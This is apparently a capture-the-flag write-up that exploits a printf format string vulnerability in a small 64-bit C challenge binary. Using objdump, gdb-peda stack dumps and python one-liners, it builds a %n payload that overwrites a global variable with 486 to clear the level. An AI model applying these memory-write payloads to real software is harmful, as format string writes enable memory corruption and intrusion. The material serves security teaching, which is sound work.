Let's take a look at the code...

```
#include <stdio.h>
#include <stdlib.h>

int var0 = 0;

void fun0()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);

	if (var0 == 486)
		{
			printf("What type of a guy would take advantage of a printf? I'll tell you. Level Cleared\n");
		}
	printf("The value of var0 is %d\n", var0);
	}

int main()
{
	fun0();
}
```

So we can see that this challenge is pretty similar to the previous challenge. The only real difference is that the if then statement is checking to see if the value is equal to a specific value. This is something we can deal with towards the end, but first off we have to go throught the same process that we did for the previous challenge.

First let's find the address of the var0 int. Since it is a global int, it should have a static address that we can view using objectdump.

```
$	objdump -t ./f2_64 | grep var0
000000000060105c g     O .bss	0000000000000004              var0
```

Now that we have the address of var0 (0x60105c) closer to being able to write the exploit. Next we need to find out where the address in our exploit will be stored in memory. For this we will feed the program a string that should be the same length as our exploit, and look at where it is in gdb.

```
$	python -c 'print "%5$x" + "\xad\xde\xbe"' > p1
```

and now onto gdb (we will be analyzing the program's memory right after the vulnerable printf call which)

```
gdb-peda$ b *fun0+59
Breakpoint 1 at 0x4006a1
gdb-peda$ r < p1
Starting program: /Hackery/escape/fmt_str/f2_64/f2_64 < p1

 [----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xabede6461787824 
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x60201a --> 0x0 
RDI: 0x7fffffffddb0 --> 0xde64617878243525 
RBP: 0x7fffffffde20 --> 0x7fffffffde30 --> 0x400700 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffddb0 --> 0xde64617878243525 
RIP: 0x4006a1 (<fun0+59>:	call   0x400530 <printf@plt>)
R8 : 0x60201a --> 0x0 
R9 : 0xd ('\r')
R10: 0x7ffff7dd1b78 --> 0x603010 --> 0x0 
R11: 0x246 
R12: 0x400570 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdf10 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400695 <fun0+47>:	lea    rax,[rbp-0x70]
   0x400699 <fun0+51>:	mov    rdi,rax
   0x40069c <fun0+54>:	mov    eax,0x0
=> 0x4006a1 <fun0+59>:	call   0x400530 <printf@plt>
   0x4006a6 <fun0+64>:	
    mov    eax,DWORD PTR [rip+0x2009b0]        # 0x60105c <var0>
   0x4006ac <fun0+70>:	cmp    eax,0x1e6
   0x4006b1 <fun0+75>:	jne    0x4006bd <fun0+87>
   0x4006b3 <fun0+77>:	mov    edi,0x400788
Guessed arguments:
arg[0]: 0x7fffffffddb0 --> 0xde64617878243525 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 --> 0xde64617878243525 
0008| 0x7fffffffddb8 --> 0xabe 
0016| 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffddc8 --> 0x0 
0032| 0x7fffffffddd0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x0 
0048| 0x7fffffffdde0 --> 0xff00000000000000 
0056| 0x7fffffffdde8 --> 0xff0000000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004006a1 in fun0 ()
gdb-peda$ x/2x 0x7fffffffddb0
0x7fffffffddb0:	0xde64617878243525	0x0000000000000abe
gdb-peda$ r < p1
Starting program: /Hackery/escape/fmt_str/f2_64/f2_64 < p1

 [----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xabedead 
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x602018 --> 0x0 
RDI: 0x7fffffffddb0 --> 0xabedead78243525 
RBP: 0x7fffffffde20 --> 0x7fffffffde30 --> 0x400700 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffddb0 --> 0xabedead78243525 
RIP: 0x4006a1 (<fun0+59>:	call   0x400530 <printf@plt>)
R8 : 0x602018 --> 0x0 
R9 : 0xd ('\r')
R10: 0x7ffff7dd1b78 --> 0x603010 --> 0x0 
R11: 0x246 
R12: 0x400570 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdf10 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400695 <fun0+47>:	lea    rax,[rbp-0x70]
   0x400699 <fun0+51>:	mov    rdi,rax
   0x40069c <fun0+54>:	mov    eax,0x0
=> 0x4006a1 <fun0+59>:	call   0x400530 <printf@plt>
   0x4006a6 <fun0+64>:	
    mov    eax,DWORD PTR [rip+0x2009b0]        # 0x60105c <var0>
   0x4006ac <fun0+70>:	cmp    eax,0x1e6
   0x4006b1 <fun0+75>:	jne    0x4006bd <fun0+87>
   0x4006b3 <fun0+77>:	mov    edi,0x400788
Guessed arguments:
arg[0]: 0x7fffffffddb0 --> 0xabedead78243525 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 --> 0xabedead78243525 
0008| 0x7fffffffddb8 --> 0x0 
0016| 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffddc8 --> 0x0 
0032| 0x7fffffffddd0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x0 
0048| 0x7fffffffdde0 --> 0xff00000000000000 
0056| 0x7fffffffdde8 --> 0xff0000000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004006a1 in fun0 ()
gdb-peda$ x/2x 0x7fffffffddb0
0x7fffffffddb0:	0x0abedead78243525	0x0000000000000000

```

So we can see that the mock address we gave it (0xbedead) is not stored in memory how we need it to be. We need it all to be stored in the same segment with the hex string being the last characters and only preceeded by zeros. If it isn't like that, then the exploit will not work. Here the string is stored together however there is a lot of data before and after it. We see that the next segment is full of zeros, so we can try moving our string there. Since the data in this elf is stored in little endian (least significant bit first), we can try shifting our string over by adding characters before our address.


Input:
```
python -c 'print "0000%5$x" + "\xad\xde\xbe"' > p1
```

What it looks like in gdb (the rest of these will be at same breakpoint):

```
gdb-peda$ x/2x 0x7fffffffddb0
0x7fffffffddb0:	0x7824352530303030	0x000000000abedead
```

So this is a big improvement. We managed to successfully move over the "bedead" hex string over to the next segment by adding four zeros before the address. Now there is still a character that we need to deal with, which is the a before the hex string "bedead". We can try moving that over by adding zeros after our address, because it is stored in little endian. 10 should be able to do it.

Input:
```
python -c 'print "0000%5$x" + "\xad\xde\xbe\x00\x00\x00\x00\x00"' > p1
```

What it looks like in gdb:
```
gdb-peda$ x/3x 0x7fffffffddb0
0x7fffffffddb0:	0x7824352530303030	0x0000000000bedead
0x7fffffffddc0:	0x000000000000000a
```

Now we can see that we successfully moved the a over to the next segment. Keep in mind that we wanted to pass the hex equivalent for zero instead of any other valyue, because zero is the only value that we could use to take up that space and not change the value of the address. Now that we figured out the format, let's make sure that we can use the format string vulnerabillity to properly read the address (if it can't. then it probably won't work). Judging from the location of where the hex string "bedead" is, we will probably have to use 7 dwords as the distance for our printf exploit since with these binaries 0x7fffffffddb0 usually takes up the spot with a distance of 6 dwords.

```
$	python -c 'print "0000%7$x" + "\xad\xde\xbe\x00\x00\x00\x00\x00"' | ./f2_64 
0000bedead�޾The value of var0 is 0
```

So it looks like it worked. Now let's replace 0xbedead with the actual address of var0, and the x flag with the n flag so we can write to the var0 address.

```
$	python -c 'print "0000%7$n" + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
0000\`The value of var0 is 4
```

So we were able to write to the var0 variable and change it's value. However we were only able to write 4 to it. We need to change the value of var0 to 486 in order for it to pass the check. We can do this by adding "%482x" to front of the "%7$n" in order to write an additional 482 bytes to var0. This will probably mess up the formatting but let's try it!

```
$	python -c 'print "0000%482x%7$n" + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
Segmentation fault (core dumped)
```

So that didn't work. We see that there are four zeroes in the front, let's try removing those and one digit from the 482 decimal that way if has the same number of characters as the working format.

```
$	python -c 'print "%48x%7$n" + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
                                          602021\`The value of var0 is 48

```

So we see we were able to change the value of var0 to 48, which is the same number we gave the %x to write. Now let's try adding an additional decimal to that number so we can finish this level.

```
$	python -c 'print "%482x%7$n" + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
Segmentation fault (core dumped)
```

So that didn't work. Let's change the n flag to x so it doesn't crash the program, then ise gdb to figure out the correct format for this using the same breakpoint as before.

Input:
```
$	python -c 'print "%482x%7$x" + "\x5c\x10\x60\x00\x00\x00\x00\x00"' > p2
```

What we see in gdb:
```
gdb-peda$ x/3x 0x7fffffffddb0
0x7fffffffddb0:	0x2437257832383425	0x0000000060105c78
0x7fffffffddc0:	0x0000000000000a00
```

So we see that the hex string 78 (which in ascii is "x") right after our hex string, and is the thing that is messing up our exploit. That "x" is probably from our input. Let's change "%7$x" to "%7$0" to confirm it.

Input:
```
$	python -c 'print "%482x%7$0" + "\x5c\x10\x60\x00\x00\x00\x00\x00"' > p2
```

What we see in gdb:
```
gdb-peda$ x/3x 0x7fffffffddb0
0x7fffffffddb0:	0x2437257832383425	0x0000000060105c30
0x7fffffffddc0:	0x0000000000000a00
```

So where we used to see the hex string for "x", we now see it for 0 so that confirms that it is from our input (we could have also just looked at what is currently on the stack with gdb to see it). So to get around this, we will have to move the address "60105c" to it's own segment. We should be able to do this by adding 7 ascii zeros to the beginning.

Input:
```
gdb-peda$ x/4x 0x7fffffffddb0
0x7fffffffddb0:	0x2530303030303030	0x7824372578323834
0x7fffffffddc0:	0x000000000060105c	0x000000000000000a
```

So that worked out nicely. Now that our address is properly formatted in it's own segment, let's make sure we can read it using a format string exploit with the same format. Of course it is now 8 segments after the printf call, instead of 7.

```
python -c 'print "00000%482x.%8$x." + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
00000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            602029.60105c.\`The value of var0 is 0
```

To make things easier to read, I replaced to of the zeros with periods before and after the segment were reading, just to make it easier to read. As you can see we read the correct address, so we should be able to change "%8$x" to "%8$n" to write the data to the var0 integer.

```
python -c 'print "00000%482x.%8$n." + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
00000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            602029..\`The value of var0 is 488
```

As you can see, we were able to sucessfully write to the var0 integer. However we wrote to more bytes than we were supposed to (probably because of our formatting). We can correct this by writing 480 bytes instead of 482.

```
$	python -c 'print "00000%480x.%8$n." + "\x5c\x10\x60\x00\x00\x00\x00\x00"' | ./f2_64 
00000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          602029..\`What type of a guy would take advantage of a printf? I'll tell you. Level Cleared
The value of var0 is 486
```

Just like that, we pwned the binary!